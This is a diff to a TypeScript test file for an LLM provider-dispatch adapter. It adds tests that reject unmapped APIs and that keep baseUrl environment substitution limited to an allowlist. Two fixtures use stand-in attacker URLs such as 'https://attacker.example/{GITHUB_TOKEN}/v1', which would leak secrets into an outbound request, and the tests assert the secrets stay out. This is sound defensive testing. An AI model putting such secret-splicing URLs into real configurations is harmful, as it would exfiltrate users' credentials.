@@ -41,12 +41,48 @@ describe("factory streamSimple — dispatch", () => {
     expect(fx.dispatches[0].via).not.toBe("provider:anthropic");
   });
 
-  it("falls back to the owning built-in provider when the api is unmapped", async () => {
+  // Finding 1: the provider is consulted ONLY when the model names no api.
+  // Falling back to the built-in PROVIDER for an unmapped api is unsafe —
+  // `createProvider`'s single-api form ignores `model.api` entirely
+  // (`apiFor = (model) => single ?? byApi?.[model.api]`), so
+  // `cloudflare-workers-ai` would stream an `anthropic-messages` model through
+  // the OpenAI-completions api. 0.75.5 threw here; so do we.
+  it("rejects an unmapped api instead of routing it through the built-in provider", async () => {
+    const fx = makeFactoryFixture({ providers: ["anthropic", "cloudflare-workers-ai"] });
+    const { module } = await adaptPiAi(fx.module, FIXTURE_PATH, fx.deps);
+
+    expect(() =>
+      module.streamSimple({ provider: "anthropic", id: "custom", api: "future-api" }, { messages: [] }),
+    ).toThrow(/future-api/);
+    expect(fx.dispatches).toEqual([]);
+  });
+
+  it("falls back to the owning provider only when the model names no api at all", async () => {
     const fx = makeFactoryFixture({ providers: ["anthropic"] });
     const { module } = await adaptPiAi(fx.module, FIXTURE_PATH, fx.deps);
 
-    await drain(module.streamSimple({ provider: "anthropic", id: "x", api: "future-api" }, { messages: [] }));
+    await drain(module.streamSimple({ provider: "anthropic", id: "api-less" }, { messages: [] }));
     expect(fx.dispatches[0].via).toBe("provider:anthropic");
+  });
+
+  // A table-mapped api whose lazy module fails to load must NOT degrade into a
+  // different api; the failure is reported with its reason.
+  it("reports a mapped-but-unloadable api with the load failure, never a fallback", async () => {
+    const fx = makeFactoryFixture({ providers: ["anthropic"] });
+    const realImport = fx.deps.importPath;
+    fx.deps.importPath = async (p: string) => {
+      if (p.includes("openai-completions")) throw new Error("simulated module failure");
+      return realImport(p);
+    };
+    const { module } = await adaptPiAi(fx.module, FIXTURE_PATH, fx.deps);
+
+    expect(() =>
+      module.streamSimple(
+        { provider: "anthropic", id: "m", api: "openai-completions" },
+        { messages: [] },
+      ),
+    ).toThrow(/simulated module failure/);
+    expect(fx.dispatches).toEqual([]);
   });
 
   // test-plan #E7 — diagnosable AND credential-free.
@@ -234,6 +270,57 @@ describe("factory streamSimple — baseUrl placeholders (task 1.11 regression)",
 
     await drain(module.streamSimple(model, { messages: [] }, {}));
     expect(fx.dispatches[0].model).toBe(model);
+  });
+
+  // Finding 2: restoring the Cloudflare substitution must NOT make the seam a
+  // generic environment reader. An unlisted name in a model's baseUrl stays
+  // VERBATIM, so a config with `baseUrl: "https://attacker.example/{GITHUB_TOKEN}"`
+  // cannot splice a secret into an outbound URL.
+  it("does not substitute a non-allowlisted env name", async () => {
+    const fx = makeFactoryFixture();
+    const { module } = await adaptPiAi(fx.module, FIXTURE_PATH, fx.deps);
+    vi.stubEnv("GITHUB_TOKEN", "ghp_super_secret");
+
+    const model = {
+      provider: "anthropic",
+      id: "leaky",
+      api: "anthropic-messages",
+      baseUrl: "https://attacker.example/{GITHUB_TOKEN}/v1",
+    };
+    await drain(module.streamSimple(model, { messages: [] }, {}));
+
+    const dispatched = fx.dispatches[0].model.baseUrl;
+    expect(dispatched).not.toContain("ghp_super_secret");
+    expect(dispatched).toContain("{GITHUB_TOKEN}");
+    vi.unstubAllEnvs();
+  });
+
+  it("does not substitute a non-allowlisted name even when the caller supplies env", async () => {
+    const fx = makeFactoryFixture();
+    const { module } = await adaptPiAi(fx.module, FIXTURE_PATH, fx.deps);
+
+    const model = {
+      provider: "anthropic",
+      id: "leaky",
+      api: "anthropic-messages",
+      baseUrl: "https://attacker.example/{AWS_SECRET_ACCESS_KEY}/v1",
+    };
+    await drain(module.streamSimple(model, { messages: [] }, { env: { AWS_SECRET_ACCESS_KEY: "s3cret" } }));
+
+    const dispatched = fx.dispatches[0].model.baseUrl;
+    expect(dispatched).not.toContain("s3cret");
+    expect(dispatched).toContain("{AWS_SECRET_ACCESS_KEY}");
+  });
+
+  it("leaves an allowlisted placeholder verbatim when it cannot be resolved", async () => {
+    const fx = makeFactoryFixture();
+    const { module } = await adaptPiAi(fx.module, FIXTURE_PATH, fx.deps);
+    vi.stubEnv("CLOUDFLARE_ACCOUNT_ID", "");
+    vi.stubEnv("CLOUDFLARE_GATEWAY_ID", "");
+
+    await drain(module.streamSimple(cfModel, { messages: [] }, { env: {} }));
+    expect(fx.dispatches[0].model.baseUrl).toContain("{CLOUDFLARE_ACCOUNT_ID}");
+    vi.unstubAllEnvs();
   });
 });
 
